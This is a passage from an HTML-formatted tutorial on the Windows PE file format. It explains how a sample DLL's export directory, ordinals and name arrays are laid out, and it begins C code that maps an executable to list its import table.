font-family:"Trebuchet MS";color:#000066'>0 0042477C aaa<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>1 00424780 abc<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>2 00424784 bbb<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>3 00424788 pqr<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>4 0042478C xyz<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The above program displays the
exports data section in the file e.dll.<span style="mso-spacerun: yes"> 
</span>The initial part of the program remains the same as before. Functions
like CreateFile, CreateFileMapping and MapViewOfFile loads the dll e.dll in
memory at memory location 310000. The start of a PE file contains a DOS header
that gives the location of the PE header. After the characters P,E,0,0 comes
the Image File header which is followed by the Image Optional header. The
optional header is followed by the section headers. These headers have been
explained earlier on except for the Optional header that has a series of<span
style="mso-spacerun: yes">   </span>structures with two members Virtual Address
and Virtual Size. The Virtual Address reports on the memory location of a
particular set of data i.e. its RVA and the Size member gives its size. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first structure of the Data
Directory structure stores details on the exports information whereas the
second one is on the imports data.<span style="mso-spacerun: yes">  </span>We
will limit our learning to these two structures for the time being. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first DataDirectory structure
states that the exports section begins 4710 bytes from the start of the file
and its size is 80 bytes. Thus in effect, export data takes up only 80 bytes.
Also, 4710 is an RVA or an offset from the start of the file loaded in memory.
Remember the file on disk in not loaded in memory in the same manner as the map
functions. The file is broken up into sections and each section is loaded in
memory depending upon the section header. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>It is for this reason, that we now
need to find out which section stores the exports data. The only way out is by
iterating through the section header and checking the section that contains the
RVA, which is 4710, the value stored in variable beginexportsrva. At the same
time, the section details are also displayed again. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>In the if statement we check if the
variable beginexportsrva or the start of the exports rva is greater than or
equal to the VirtualAddress field, i.e the start of the section in memory. The
section also should be large enough to contain the export data. This is done by
checking the end of the exports data which must be less than or equal to the
VirtualAddress plus the size of the section. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first section starts at an RVA of
1000 or 4096 bytes as the file starts with the PE header. Since the section
alignment is 4096 bytes, each section starts at a multiple of 4096 irrespective
of the size of the section data. The section called rdata starts at rva 0x4000
and has a size of 790 bytes, therefore it ends at 4790.<span
style="mso-spacerun: yes">  </span>This value is less than or equal to
endexportsrva which is the end of the exports data. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Since the if statement results in
true for the second section, the loop is terminated with the details of the
second section being stored in the psectionheader variable. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>A variable called diff is computed to
be zero in the case of e.dll but for dll’s like kernel32.dll it will have a different
value which is 0xc00 as the exports data is found in the first section, loaded
in memory at 0x1000. Also, the pointer to raw data has a value of 0x400. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus on the disk, the export section
of kernel32 section will start at 0x400 from the start of the file but in
memory when the actual loader loads it, the section will be loaded at 0x1000.
As a result, since we are using the map functions to read the file, the value
of diff must be subtracted to arrive at right rva. The rva’s are always with respect
to the Virtual Address. The newer versions of the linkers give the rva and
pointer to raw data the same value. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The variable startoffile is made
equal to pmappedfile which has a value of 310000 and indicates the start of
file in memory. Then the actual start of the exports directory pexportdirectory
is computed. This is an rva and variable beginexportsrva is used which is
calculated with the help of start of the file stored in variable startoffile
minus the diff variable which for e.dll is zero. Thus the exports data is
stored at memory location 00424710. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This data is represented in a
structure that looks like Export Directory thus facilitating in the display of
some of its members.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first member is the name of the
dll which is stored at memory location 424776. Then is a field called
Characteristics whose present value is zero. This is followed by the date time
stamp of a long datatype. This value can be converted to a string format using
the function called ctime. This is followed by the major and minor version
numbers which are also zero. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>In the def file, the first function
xyz is given an ordinal number 5, the function aaa an ordinal number of 7 and
function bbb 12. The abc and pqr functions are not given any ordinal numbers. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus our ordinal number starting
point is 5 and as we have not given the abc function a ordinal number it is
given a value 6. The def file overrules everything and as the aaa function has
a ordinal number 7, the pqr function is given a ordinal number of 8 and finally
bbb 12.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus the def file decides the ordinal
numbers and the functions that do not have ordinal numbers are given the ones
in the middle. The Base member of the exports directory gives us the starting
point of the ordinal numbers, in our case 5. The next two members Number of
Functions and Number of names is normally the same. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Number of functions member tells
us how many functions are to be exported. The Number of names gives us the
number of functions that are exported by name plus empty gaps. If you look at
the def file for e.dll, the last function is given a ordinal number of 12 and
the second last function pqr has a ordinal number of 8. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus the array NumberOfFunctions has
to have 3 empty members to account for the ordinal number 9, 10 and 11 that have
no functions. The Ordinal Number array has a many members as the last ordinal
number minus the ordinal base. Thus if we change the last functions bbb’s
ordinal number to 100, the Number of<span style="mso-spacerun: yes"> 
</span>functions will change to 96. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Each function that we export has
three bits of information associated with it. The first is the rva of where the
function starts in memory. Then its ordinal number and finally its name. Thus
in the exports directory we have three arrays which store the above data. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>These arrays are called the
AddressOfFunctions, AddressOfNameOrdinals and finally the AddressOfNames. As we
may have only five exported functions, the size of this array is 32 bytes as
the other three members are zero to account for empty slots 9, 10 , 11. These
three arrays are stored back to back. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first array AddressOfNames starts
00004738, followed by the array of functions at 00004758 which is 32 bytes
away. The third array starts 0000476c which is 20 bytes away as this array has
only 5 names as we have five functions to be exported. Thus the three array
sizes are not equal.<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Now as always we want to convert
these numbers to our memory space and thus we create three new variables by
adding startoffile and subtracting diff. We have to now display the details of
the exported functions stored in these three arrays. We use the member
NumberOfFunctions to decide how long the<span style="mso-spacerun: yes"> 
</span>loop iterates. We first check if the AddressOfFunctions<span
style="mso-spacerun: yes">  </span>member is zero. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>If yes we know that no such function
exists and thus go back to start of the loop. Remember there are no functions
for ordinal numbers 9, 10 and 11. These entries will have a value of zero. We
display the address of the function and then the ordinal number. The loop
variable I is added to the ordinal base to give us the ordinal number. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>If this gets a little difficult we
have also displayed at the end of the program the contents of the three arrays.
The first array that gives us the address of the functions is decided by the last
ordinal number minus the ordinal base which in our case works out to 12 – 5 or
8. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The missing ordinal numbers have a
zero as the value. The first function has the ordinal number of the member
Ordinal Base and the next function, a ordinal number that is increased by 1.
Now starts the complication. The Name Ordinals array is not ordered at all and
contains the same number of members as the address of names. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>So if we want to find the name of a
function with ordinal number 6 the function abc, we know that as it is the
second function, the value of I is 1. The loop variable is the ordinal number +
ordinal base. We thus scan the ordinal base array for a member whose value is 1
and not 6. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The values of the ordinal base array
are not the ordinal numbers but ordinal numbers minus ordinal base. The offset
in this Name Ordinal array<span style="mso-spacerun: yes">  </span>gives us the
offset in the Names array.<span style="mso-spacerun: yes">  </span>Thus the
system first stores the names of the functions in memory and the addresses of
these names in the Name Address array. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Then it fills up the Name Ordinal
array with the ordinals numbers corresponding with the names. Thus the first
member of the Names array contains the address of aaa and the Name Ordinal
array its ordinal number 7 – 5 or 2.<span style="mso-spacerun: yes">  </span>The
last function in the Names array stores the address of xyz function and as its
ordinal number is 5, the last member of the Name ordinal array has a value of 5
– 5 i.e. 0. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Address of Function array is
indexed on Ordinal Number minus ordinal base. If you have noticed the Names
array is sorted on the name of the function. Thus we first read the address of
the function, its index into the array is the ordinal number plus Ordinal Base.
We then find a corresponding value in the Name Ordinal array. This index gives
us the address of the name in the Address of Names array. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Imports table.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>d.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>MessageBox(0,&quot;hi&quot;,&quot;bye&quot;,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>MessageBox(0,&quot;hi1&quot;,&quot;bye1&quot;,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>GetDC(0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>ReleaseDC(0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>cl d.c user32.lib<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Microsoft has given plenty of dlls
from where code can be easily picked up when writing any code. However, this
code does not physically get added to the exe file but instead, a list is
maintained of all dlls’s along with the functions used from them. This list is
called the imports section. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>In the above exe file e.exe, three
functions are called from the dll user32.dll. Lets now display the import data
section stored in file e.exe. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>b.cpp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;time.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile, *dummy;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;d.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>dummy = (unsigned char<span
style="mso-spacerun: yes">  </span>*)(pmappedfile +
pimagedosheader-&gt;e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_FILE_HEADER *pimagefileheader =
(IMAGE_FILE_HEADER *)(pmappedfile + pimagedosheader-&gt;e_lfanew +4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_OPTIONAL_HEADER
*pimageoptionalheader = (IMAGE_OPTIONAL_HEADER *)((unsigned char
*)pimagefileheader+sizeof(IMAGE_FILE_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>PIMAGE_SECTION_HEADER psectionheader;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>psectionheader =
(PIMAGE_SECTION_HEADER)((char *)pimageoptionalheader + sizeof(IMAGE_OPTIONAL_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD importstartrva,importendrva;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>importstartrva =
pimageoptionalheader-&gt;DataDirectory[1].VirtualAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>importendrva = importstartrva +
pimageoptionalheader-&gt;DataDirectory[1].Size;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;importstartrva=%x
size=%x\n&quot;,importstartrva,pimageoptionalheader-&gt;DataDirectory[1].Size);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Section No Name<span
style="mso-spacerun: yes">    </span>Virtual Address PointerToRawData
VirtualSize\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for ( i=0; i &lt;
pimagefileheader-&gt;NumberOfSections; i++, psectionheader++ )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%2d<span
style="mso-spacerun: yes">         </span>%-7s<span style="mso-spacerun:
yes">   </span>%x<span style="mso-spacerun: yes">            </span>%x<span
style="mso-spacerun: yes">              </span>%x\n&quot;,i,psectionheader-&gt;Name,psectionheader-&gt;VirtualAddress,psectionheader-&gt;PointerToRawData,psectionheader-&gt;Misc.VirtualSize);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if ( (importstartrva<span
style="mso-spacerun: yes">  </span>&gt;= psectionheader-&gt;VirtualAddress)
&amp;&amp; (importstartrva &lt; (psectionheader-&gt;VirtualAddress +
psectionheader-&gt;Misc.VirtualSize)))<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD diff,startoffile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>diff =
(INT)(psectionheader-&gt;VirtualAddress - psectionheader-&gt;PointerToRawData);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>PIMAGE_IMPORT_DESCRIPTOR
pimportDescriptor;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>startoffile = (DWORD)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pimportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(startoffile
+ importstartrva - diff);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;psectionheader=%x
pimportDescriptor=%x\n&quot;,psectionheader , pimportDescriptor);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>while ( 1 )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if (
(pimportDescriptor-&gt;TimeDateStamp==0 ) &amp;&amp;
(pimportDescriptor-&gt;Name==0) )<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Name of Dll:%s\n&quot;,
pimportDescriptor-&gt;Name -diff + startoffile );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Characteristics:%08X
(Unbound IAT)\n&quot;,pimportDescriptor-&gt;Characteristics);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;TimeDateStamp:%08X
%s&quot;,pimportDescriptor-&gt;TimeDateStamp,ctime((PLONG)&amp;pimportDescriptor-&gt;TimeDateStamp));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;ForwarderChain:%08X\n&quot;,pimportDescriptor-&gt;ForwarderChain);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;First thunk
RVA:%08X\n&quot;,pimportDescriptor-&gt;FirstThunk);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>PIMAGE_THUNK_DATA
pthunkdata,pthunkdatafirst;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>long *pFirstThunk;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pthunkdata =
(PIMAGE_THUNK_DATA)pimportDescriptor-&gt;Characteristics;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pFirstThunk = (long
*)pimportDescriptor-&gt;FirstThunk;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pthunkdatafirst =
